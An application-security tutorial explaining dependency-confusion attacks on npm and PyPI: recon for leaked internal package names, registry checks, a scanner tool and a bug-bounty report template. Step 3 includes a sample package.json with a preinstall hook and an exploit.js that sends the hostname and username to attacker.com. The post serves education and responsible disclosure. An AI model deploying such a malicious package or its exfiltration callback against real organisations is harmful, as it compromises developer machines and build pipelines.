# NPM / PyPI Namespace Squatting: Your Private Package, Published by Someone Else

**Severity:** MEDIUM | **Category:** Recon | **Series:** #300DaysWithAppSec

---

## The $130,000 Bug That Changed Supply Chain Security

In 2021, security researcher Alex Birsan published a technique he called "dependency confusion" — and used it to get code execution inside Apple, Microsoft, PayPal, Uber, Shopify, and 32 other major companies. He earned over $130,000 in bug bounties. The entire attack was passive recon followed by registering a package name.

The vulnerability? When a company uses private packages (like `@company/internal-auth`), but that name doesn't exist on the public registry, any attacker can register it — and `npm install` will happily pull the attacker's version.

---

## How It Works — The Dependency Confusion Attack

### Step 1: Find Private Package Names

Companies use internal packages but leak their names through:

```bash
# In bundled JS files
grep -oE '@[a-z0-9-]+/[a-z0-9-]+' app.bundle.js
# Found: @target/internal-auth, @target/db-utils, @target/api-client

# In public GitHub repos (package.json files)
# Search: org:target filename:package.json "dependencies"
# Find: "@target/utils": "1.0.0" in dependencies

# In error messages on the website
# "Error: Cannot find module '@target/config-loader'"

# In job postings ("experience with @target/design-system")
```

### Step 2: Check if Name is Unclaimed

```bash
# npm — check if public package exists
npm info @target/internal-auth
# npm ERR! 404 Not Found - '@target/internal-auth' is not in the npm registry
# → CLAIMABLE

# PyPI — check if Python package exists  
pip index versions target-internal-lib
# WARNING: pip index is currently an experimental command
# ERROR: No matching distribution found
# → CLAIMABLE

# Quick curl check
curl -s https://registry.npmjs.org/@target/internal-auth | python3 -m json.tool | head -5
# {"error":"Not found"} → package doesn't exist → you can register it
```

### Step 3: How the Attack Would Work (For Report Purposes Only)

```javascript
// attacker registers @target/internal-auth on npm
// package.json
{
  "name": "@target/internal-auth",
  "version": "9999.0.0",  // high version number wins over private registry
  "scripts": {
    "preinstall": "node exploit.js"  // runs automatically on npm install
  }
}

// exploit.js — what Birsan did (just sent hostname/user info back)
const os = require('os');
const https = require('https');
https.get(`https://attacker.com/callback?host=${os.hostname()}&user=${os.userinfo().username}`);
```

When any developer at the company runs `npm install`, npm checks the public registry first, finds version 9999.0.0, and executes the preinstall script — giving the attacker code execution on the developer's machine and potentially in CI/CD pipelines.

---

## Finding Vulnerable Targets — Full Methodology

### Source 1: JavaScript Bundles

```bash
# Download all JS files and grep for internal package names
gau target.com --ft js | while read url; do
    curl -sk "$url" | grep -oE '"@[a-z0-9_-]+/[a-z0-9_-]+"' | tr -d '"'
done | sort -u | grep -v node_modules
```

### Source 2: Public GitHub Repos

```bash
# Search for package.json files in the org's public repos
# On GitHub search: org:target filename:package.json

# Clone and inspect
for repo in $(gh repo list target --public --json name -q '.[].name'); do
    gh api "repos/target/$repo/contents/package.json" \
        --jq '.content' 2>/dev/null | base64 -d | \
        python3 -c "import json,sys; deps=json.load(sys.stdin).get('dependencies',{}); [print(k) for k in deps if k.startswith('@target')]"
done
```

### Source 3: Error Pages and Stack Traces

```bash
# Trigger 404s and error conditions
curl https://target.com/nonexistent-endpoint-xyz
# Response may contain: "Cannot find module '@target/router'"
# → internal package name leaked in error message
```

### Source 4: Wayback Machine and Old Packages

```bash
# Search historical npm registry data
echo "target.com" | waybackurls | grep "package.json" | while read url; do
    curl -sk "$url" | python3 -c "
import json,sys
try:
    d=json.load(sys.stdin)
    for k in list(d.get('dependencies',{}).keys())+list(d.get('devDependencies',{}).keys()):
        if '@target' in k or 'target' in k.lower():
            print(k)
except: pass
"
done
```

---

## The "confused" Tool — Automated Scanner

```bash
# Install
pip3 install confused --break-system-packages

# Scan a package.json
confused -l npm package.json

# Scan requirements.txt
confused -l pypi requirements.txt

# Output:
# [ALERT] @target/internal-auth - Not found in npm registry - potential dependency confusion target
# [ALERT] target-utils - Not found in PyPI - potential dependency confusion target
```

---

## Reporting This Vulnerability

**Do NOT actually register the package.** Just prove it's claimable:

```
Title: Dependency Confusion — @target/internal-auth Not Registered on npm

Severity: HIGH (most programs rate this HIGH or CRITICAL)

Description:
The package @target/internal-auth is referenced in target.com's JavaScript
bundle but does not exist on the public npm registry. An attacker can register
this package name with a higher version number than the internal version,
causing npm to install the public (attacker-controlled) version instead of the
private internal version.

Evidence:
1. Package found in JS bundle:
   https://target.com/static/js/app.chunk.js (line 1847)
   require("@target/internal-auth")
   
2. Package not in public registry:
   $ npm info @target/internal-auth
   npm ERR! 404 Not Found - '@target/internal-auth' is not in the npm registry

3. Attack path: Register @target/internal-auth with version 9999 + malicious
   postinstall script → runs on every developer machine that runs npm install

Impact:
Remote code execution on developer machines and CI/CD build systems.
Any pipeline running npm install would execute attacker-controlled code,
potentially compromising the entire build and deployment infrastructure.

Do NOT register: This report is proof-of-concept only. The package name
has not been registered on the public registry.

Remediation:
1. Register all internal package names on public registry as empty/placeholder
2. Use npm's --prefer-offline or configure registry scoping
3. Set @target:registry=https://internal.registry.target.com in .npmrc
```

---

## Key Takeaways

```
1. Dependency confusion = internal package name not claimed on public registry
2. npm/pip prefers public registry by default → attacker wins with high version
3. Find package names: JS bundles, GitHub package.json, error messages
4. Check: npm info @target/pkg → 404 = claimable = report it
5. Tools: confused (automated scanner), manual npm/pip info check
6. DO NOT register the package — just prove it's claimable
7. Alex Birsan earned $130k+ from this at 35 major companies
8. Fix: register placeholder packages + use scoped registry in .npmrc
```

---

*Written by Anand Prajapati — Penetration Tester & Security Researcher*

🔗 **Connect:** [LinkedIn](https://linkedin.com/in/anand-prajapati-7a265a369) · [GitHub](https://github.com/anand87794) · [Portfolio](https://anandprajapati.lovable.app) · [X @anand87794](https://x.com/anand87794)

*Part of the #300DaysWithAppSec series — 300 vulnerabilities, real security education.*
